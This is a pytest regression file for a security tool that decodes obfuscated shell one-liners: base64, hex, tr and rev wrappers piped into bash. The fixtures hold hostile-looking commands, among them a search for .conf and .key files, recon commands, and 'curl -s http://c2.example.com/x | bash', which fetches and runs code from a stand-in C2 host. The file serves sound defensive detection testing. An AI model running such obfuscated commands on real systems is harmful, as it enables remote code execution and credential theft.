"""Bash echo-base64-pipe decoder regression
================================================

Locks the deterministic recovery for the classic Linux
living-off-the-land pattern that L0 cannot decode natively:

    echo "<b64>" | base64 -d [| bash]
    echo '<b64>' | base64 --decode | sh
    echo <b64>   | base64 -D

Before this fix, L0's `powershell-alias-normalize` incorrectly
kicked in on `echo` (interpreter-ownership violation) and left
the base64 blob undecoded. The pre-canonical short-circuit in
`services/canonical_evidence_recovery.py` now catches the
pattern first and returns the decoded shell command as
`canonical_artifact.decoded_output` with
`chain_ids == ['decoder-bash-echo-b64-pipe']`.
"""
from __future__ import annotations
import base64

import pytest

from services.canonical_evidence_recovery import recover_canonical_evidence


def _b64(s: str) -> str:
    return base64.b64encode(s.encode()).decode()


@pytest.mark.parametrize("wrap", [
    'echo "{b64}" | base64 -d | bash',
    "echo '{b64}' | base64 -d | bash",
    'echo "{b64}" | base64 -d',
    'echo "{b64}" | base64 --decode',
    'echo "{b64}" | base64 -d | sh',
    'echo "{b64}" | base64 -d | /bin/bash',
    'echo -n "{b64}" | base64 -d | bash',
])
def test_bash_echo_b64_pipe_decodes(wrap):
    payload = 'find . -name "*.conf" -o -name "*.key"'
    text = wrap.format(b64=_b64(payload))
    art = recover_canonical_evidence(text)
    assert art.terminal_state == "recovered", (
        f"expected terminal_state='recovered' — got {art.terminal_state!r} "
        f"for wrapper {wrap!r}"
    )
    assert art.decoded_output == payload, (
        f"decoded_output mismatch for wrapper {wrap!r}: "
        f"expected {payload!r}, got {art.decoded_output!r}"
    )
    assert art.chain_ids == ["decoder-bash-echo-b64-pipe"], (
        f"chain_ids mismatch: {art.chain_ids!r}"
    )
    assert art.confidence == 100
    assert art.engine == "bash-echo-b64-pipe"


def test_bash_echo_b64_pipe_does_not_shadow_powershell():
    """Ensure the new short-circuit doesn't grab non-bash payloads."""
    ps = (
        'powershell.exe -EncodedCommand '
        + base64.b64encode('Write-Host "hi"'.encode("utf-16-le")).decode()
    )
    art = recover_canonical_evidence(ps)
    assert art.terminal_state == "recovered"
    assert art.chain_ids != ["decoder-bash-echo-b64-pipe"]
    # The PS -EncodedCommand chain must still fire.
    assert "decoder-powershell-encoded-command" in (art.chain_ids or [])


def test_bash_echo_b64_pipe_ignores_invalid_b64():
    """Malformed base64 must NOT trigger the short-circuit."""
    art = recover_canonical_evidence('echo "!!!not-b64!!!" | base64 -d | bash')
    # Should fall through to normal L0 processing, not the new decoder.
    assert art.chain_ids != ["decoder-bash-echo-b64-pipe"]


# ─── Pre-b64 obfuscation pipeline (tr / rev) ────────────────────────────
def test_bash_echo_b64_with_tr_no_op_still_recovers():
    """User-reported input: `echo "<b64>" | tr '_' ' ' | base64 -d | bash`
    where the b64 blob has no `_` characters — `tr` is a no-op and the
    decoded output must still be produced deterministically."""
    text = ('echo "ZGZfIC1oOyBmcmVlIC1tOyB1cHRpbWU=" '
            "| tr '_' ' ' | base64 -d | bash")
    art = recover_canonical_evidence(text)
    assert art.terminal_state == "recovered"
    assert art.decoded_output == "df_ -h; free -m; uptime"
    assert art.chain_ids == ["decoder-bash-echo-b64-pipe"]


def test_bash_echo_b64_with_active_tr_transforms_before_decode():
    """`tr` step that actually maps characters is applied before b64
    decode — canonical to how the pipeline actually runs at runtime."""
    # Encode "id -a; hostname" as normal, then replace 'a' -> '_' in
    # the b64 so we can prove tr undoes the obfuscation before decode.
    import base64
    real = base64.b64encode(b"id -a; hostname").decode()
    obf = real.replace("a", "_")
    text = f'echo "{obf}" | tr \'_\' \'a\' | base64 -d | bash'
    art = recover_canonical_evidence(text)
    assert art.terminal_state == "recovered"
    assert art.decoded_output == "id -a; hostname"
    assert art.chain_ids == ["decoder-bash-echo-b64-pipe"]


def test_bash_echo_b64_with_rev_reverses_before_decode():
    """`rev` step reverses the blob before decoding."""
    import base64
    original = base64.b64encode(b"whoami && id && uname -a").decode()
    reversed_blob = original[::-1]
    text = f'echo "{reversed_blob}" | rev | base64 -d | bash'
    art = recover_canonical_evidence(text)
    assert art.terminal_state == "recovered"
    assert art.decoded_output == "whoami && id && uname -a"


def test_bash_echo_hex_xxd_decodes():
    """`echo <hex> | xxd -r -p` — hex-decoder pipeline (user report)."""
    text = 'echo "77686f616d69202626206c73202d6c61" | xxd -r -p | bash'
    art = recover_canonical_evidence(text)
    assert art.terminal_state == "recovered"
    assert art.decoded_output == "whoami && ls -la"
    assert art.chain_ids == ["decoder-bash-echo-b64-pipe"]


def test_bash_echo_hex_xxd_reverse_flag_order():
    """xxd accepts flags in either order: `-p -r` or `-r -p`."""
    text = 'echo "68656C6C6F" | xxd -p -r'
    art = recover_canonical_evidence(text)
    assert art.terminal_state == "recovered"
    assert art.decoded_output == "hello"


def test_bash_echo_b64_pipe_marks_exec_shell_only_when_piped():
    """The `exec_shell` note fires only when `| bash`/`| sh` is present."""
    long_payload = "curl -s http://c2.example.com/x | bash"
    with_shell = recover_canonical_evidence(
        f'echo "{_b64(long_payload)}" | base64 -d | bash'
    )
    without_shell = recover_canonical_evidence(
        f'echo "{_b64(long_payload)}" | base64 -d'
    )
    ws_notes = " ".join(with_shell.notes or [])
    ns_notes = " ".join(without_shell.notes or [])
    assert "piped into `bash`" in ws_notes
    assert "piped into `bash`" not in ns_notes
